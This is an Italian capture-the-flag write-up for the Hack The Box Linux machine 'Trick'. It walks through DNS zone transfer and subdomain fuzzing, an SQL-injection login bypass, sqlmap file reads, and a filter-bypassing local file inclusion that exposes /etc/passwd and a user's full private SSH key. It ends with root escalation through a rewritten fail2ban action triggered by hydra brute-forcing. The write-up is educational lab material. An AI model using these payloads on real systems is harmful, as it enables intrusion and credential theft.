# Trick
* **POINTS**: 20
* **USER RATING**: Easy
* **OPERATING SYSTEM**: Linux
* **RATING**: 4.4

## 1. Recon
```shell
└─$ nmap -sC -sV -oA nmap/initial 10.10.11.166 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-09 04:18 EDT
Nmap scan report for 10.10.11.166
Host is up (0.12s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.79 seconds
```

### 1.1 Website - TCP 80
#
![web](Images/Web.png)

Ma nulla di interessante, neanche con *gobuster*

```shell
└─$ gobuster dir -u http://10.10.11.166:80 -w ~/Scaricati/SecLists/Discovery/Web-Content/common.txt                
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.166:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/asd/Scaricati/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/09 04:32:17 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 185] [--> http://10.10.11.166/assets/]
/css                  (Status: 301) [Size: 185] [--> http://10.10.11.166/css/]   
/index.html           (Status: 200) [Size: 5480]                                 
/js                   (Status: 301) [Size: 185] [--> http://10.10.11.166/js/]    
                                                                                 
===============================================================
2022/07/09 04:33:17 Finished
===============================================================
```

## 2 DNS Enum
#
Facciamo enumerazione con [dig](https://linux.die.net/man/1/dig) !

Iniziamo con capire se c'è un record *ns*

**Background**  
  L'acronimo "NS" sta per "nameserver", e il record del nameserver indica quale server DNS sia autoritativo per un dato dominio (ovvero quale server contenga i record DNS effettivi. Fondamentalmente, i record NS dicono a Internet dove recarsi per scoprire l'indirizzo IP di un dominio). 

```shell
└─$ dig ns trick.htb @10.10.11.166

; <<>> DiG 9.18.0-2-Debian <<>> ns trick.htb @10.10.11.166
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54024
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: fada88104f0f6a660382b03362c945f41b95ba44349b7b77 (good)
;; QUESTION SECTION:
;trick.htb.                     IN      NS

;; ANSWER SECTION:                                                                                                 
trick.htb.              604800  IN      NS      trick.htb.                                                         
                                                                                                                   
;; ADDITIONAL SECTION:                                                                                             
trick.htb.              604800  IN      A       127.0.0.1                                                          
trick.htb.              604800  IN      AAAA    ::1                                                                
                                                                                                                   
;; Query time: 123 msec                                                                                            
;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)                                                                     
;; WHEN: Sat Jul 09 05:10:09 EDT 2022                                                                              
;; MSG SIZE  rcvd: 124   
```

Ok, il record ns esiste... ora verifichiamo se esiste un record *mx* (anche perchè abbiamo smtp)

**Background**  
  Un Mail eXchanger record (MX record) è un tipo di risorsa nel Domain Name System che specifica un mail server autorizzato ad accettare messaggi mail per conto del dominio di destinazione, e contenente un valore indicante la priorità se sono disponibili più server email. Il set di MX records di un nome di dominio specifica come possano essere instradate le richieste di invio di posta mediante il Simple Mail Transfer Protocol (SMTP). 

```shell
└─$ dig mx trick.htb @10.10.11.166                                                                                 

; <<>> DiG 9.18.0-2-Debian <<>> mx trick.htb @10.10.11.166
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 37403
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 44ab72a2538b7a54d820ffeb62c94627296eaa8addd91ab8 (good)
;; QUESTION SECTION:
;trick.htb.                     IN      MX

;; AUTHORITY SECTION:
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800

;; Query time: 119 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)
;; WHEN: Sat Jul 09 05:11:00 EDT 2022
;; MSG SIZE  rcvd: 107
```

Ora vediamo di vedere tutti i record DNS (A, AAAA, CNAME, MX, NS, PTR, SRV, SOA, TXT, CAA, DS, DNSKEY):

```shell
└─$ dig any trick.htb @10.10.11.166                                                                                

; <<>> DiG 9.18.0-2-Debian <<>> any trick.htb @10.10.11.166
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 32778
;; flags: qr aa rd; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 53c94de6a2984b6fd83fc1ba62c94848dd8a1f338d25d2b8 (good)
;; QUESTION SECTION:
;trick.htb.                     IN      ANY

;; ANSWER SECTION:
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 119 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Sat Jul 09 05:20:05 EDT 2022
;; MSG SIZE  rcvd: 209
```

**Background**   
  https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/

```shell
└─$ dig axfr trick.htb @10.10.11.166                                                                               

; <<>> DiG 9.18.0-2-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 123 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Sat Jul 09 05:25:34 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

Abbiamo trovato un alias `preprod-payroll.trick.htb` -> lo aggiungiamo in */etc/hosts*

Vediamo se ci sono altri alias facendo del fuzzing con *ffuf*:

  ffuf -u http://trick.htb -w ~/Scaricati/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: preprod-FUZZ.trick.htb

In tal modo non abbiamo nulla, però vediamo che abbiamo *preprod-* prima del nome quindi proviamo a fare fuzzing nel seguente modo:

  ffuf -u http://trick.htb -w ~/Scaricati/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: preprod-FUZZ.trick.htb

Abbiamo molti risultati che hanno tutti *Words:1697*, quindi aggiungiamo l'opzione `--fw 1697` per non considerarli ed abbiamo un risultato

```shell
└─$ ffuf -u http://trick.htb -w ~/Scaricati/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: preprod-FUZZ.trick.htb' --fw 1697

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://trick.htb
 :: Wordlist         : FUZZ: /home/asd/Scaricati/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: preprod-FUZZ.trick.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 1697
________________________________________________

marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179]
:: Progress: [4989/4989] :: Job [1/1] :: 317 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

Abbiamo un altro alias `preprod-marketing.trick.htb` -> lo aggiungiamo in */etc/hosts*

## 3. Admin | Employee's Payroll Management System -> preprod-payroll.trick.htb
![login](Images/login.png)

Login superato tramite una SQLInj -> `' or 1=1-- -`

![dash](Images/dash.png)

Nella pagina *Users* c'è la possibilità di modificare i campi inerenti all'amministratore. Ispezionando la pagina si può far rivelare la password dell'admin

<p align="center">
  <img src="Images/user.png" />
</p>

Quindi proviamo a fare l'accesso ad *ssh* con tale info ma non ci va bene
```shell
└─$ ssh Enemigosss@10.10.11.166
The authenticity of host '10.10.11.166 (10.10.11.166)' can't be established.
ED25519 key fingerprint is SHA256:CUKzxire1i5wxTO1zNuBswEtE0u/RyyjZ+v07fOUuYY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.166' (ED25519) to the list of known hosts.
Enemigosss@10.10.11.166's password: 
Permission denied, please try again.
```

## 3. Business Oriented CSS Template -> preprod-marketing.trick.htb
![web2](Images/Web2.png)

Ma non c'è nulla di interessante

## 4. SQLMAP
Siccome sappiamo che si può fare SQLInj possiamo pensare di sfruttarla per leggere file dal DB. Intercettiamo la richiesta di login con burp e la utilizzo per avviare *sqlmap*; in particolare, vedendo la [struttura di nginx](https://wiki.debian.org/Nginx/DirectoryStructure), particolare attenzione va su */etc/nginx/sites-enable/default*

```shell
└─$ sqlmap -r burp.req --batch --dbms mysql --threads 10 --file-read=/etc/nginx/sites-enable/default
```

Nel file interessate è la seguente parte:

```
server {
  listen 80;
  listens [::]:80;

  server_name preprod-marketing.trick.htb;

  root /var/www/market;
  index index.php:

  location / {
    try_files $uri/ =404;
  }
  
    location ~ \.php$ {
      include snippets/fastcgi-php.conf;
      fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
    }
}
```

Quindi ci leggiamo l'index di tale pagina

```shell
└─$ sqlmap -r burp.req --batch --dbms mysql --threads 10 --file-read=/var/www/market/index.php
```

Interessante ciò che troviamo poichè ci suggerisce la presenza di **LFI** sul parametro *page*, nella pagina *preprod-marketing.trick.htb*

```php
<?php
$file = $_GET['page'];

if(!isset(file) || ($file=="index.php")) {
  include("/var/www/market/home.html"); 
}
else {
  include("/var/www/market/".str_replace("../","",$file));
}
?>
```

## 5. LFI
Superare l'escaping è molto semplice poichè viene tolto solo "../" quindi, per bypassare tale replace basta inserire "..././".

Arrivati a questo punto, da burp proviamo a inviare un payload del genere fino a quando non avremo il risultato: `page=..././etc/passwd`

Trovata "la distanza" corretta: `GET /index.php?page=..././..././..././..././..././..././etc/passwd`

```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sat, 09 Jul 2022 12:44:44 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 2351


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

Interessante l'utente *michael*, quindi cerchiamo di leggere la chiave ssh:
`GET /index.php?page=..././..././..././..././..././..././home/michael/.ssh/id_rsa`

```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sat, 09 Jul 2022 12:51:32 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1823


-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Perfetto vediamo ora l'*authorized_keys* per vedere dove dobbiamo connetterci con ssh:
`GET /index.php?page=..././..././..././..././..././..././home/michael/.ssh/authorized_keys`

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAj1gsVEpPokVNKo+3b/7uaCDkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizEhkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1LjnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryx michael@trick
```

Salviamo la chiave in un file, cambiamo i permessi (600) e facciamo il login con ssh:

```shell
└─$ ssh -i key.priv michael@trick
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$
```

Nella home directory abbiamo la user flag: `8067e13e5e14570f80d24dd75b7949d8`

## 6. Privilege Escalation
Nei meccanicismi per tale sezione, interessante è l'output prodotto dal comando *sudo -l*:

```shell 
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart       
```

Cercando su Google, ho trovato un [articolo](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/) nella quale spiega come sfruttare tale errore per fare privilege.

Effettuiamo tutti i passaggi descritti:

```shell
michael@trick:/etc/fail2ban/action.d$ ls                                                                           
abuseipdb.conf                 iptables-allports.conf               npf.conf                                       
apf.conf                       iptables-common.conf                 nsupdate.conf                                  
badips.conf                    iptables.conf                        osx-afctl.conf                                 
badips.py                      iptables-ipset-proto4.conf           osx-ipfw.conf                                  
blocklist_de.conf              iptables-ipset-proto6-allports.conf  pf.conf                                        
bsd-ipfw.conf                  iptables-ipset-proto6.conf           route.conf                                     
cloudflare.conf                iptables-multiport.conf              sendmail-buffered.conf                         
complain.conf                  iptables-multiport-log.conf          sendmail-common.conf                           
dshield.conf                   iptables-new.conf                    sendmail.conf
dummy.conf                     iptables-xt_recent-echo.conf         sendmail-geoip-lines.conf
firewallcmd-allports.conf      mail-buffered.conf                   sendmail-whois.conf
firewallcmd-common.conf        mail.conf                            sendmail-whois-ipjailmatches.conf
firewallcmd-ipset.conf         mail-whois-common.conf               sendmail-whois-ipmatches.conf
firewallcmd-multiport.conf     mail-whois.conf                      sendmail-whois-lines.conf
firewallcmd-new.conf           mail-whois-lines.conf                sendmail-whois-matches.conf
firewallcmd-rich-logging.conf  mynetwatchman.conf                   shorewall.conf
firewallcmd-rich-rules.conf    netscaler.conf                       shorewall-ipset-proto6.conf
helpers-common.conf            nftables-allports.conf               smtp.py
hostsdeny.conf                 nftables-common.conf                 symbiosis-blacklist-allports.conf
ipfilter.conf                  nftables-multiport.conf              ufw.conf
ipfw.conf                      nginx-block-map.conf                 xarf-login-attack.conf
```

```shell
michael@trick:/etc/fail2ban/action.d$ ls iptables-multiport*
iptables-multiport.conf  iptables-multiport-log.conf
```

In */dev/shm* creiamo il file *iptables-multiport.conf* così modificato:

```
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
```

L'idea è quella di farci bannare così che l'azione corrispondente sia quella che abbiamo inserito.

Per far ciò utilizziamo *hydra* per cercare di fare il login a ssh con password false:

```shell
─$ hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.10.11.166
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-09 10:24:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1009 login tries (l:1/p:1009), ~64 tries per task
[DATA] attacking ssh://10.10.11.166:22/
[STATUS] 133.00 tries/min, 133 tries in 00:01h, 881 to do in 00:07h, 16 active
```

Dopo che siamo stati bannati, in */tmp* abbiamo la root flag: `e0437cf969b1e0f58e630b66f5142253`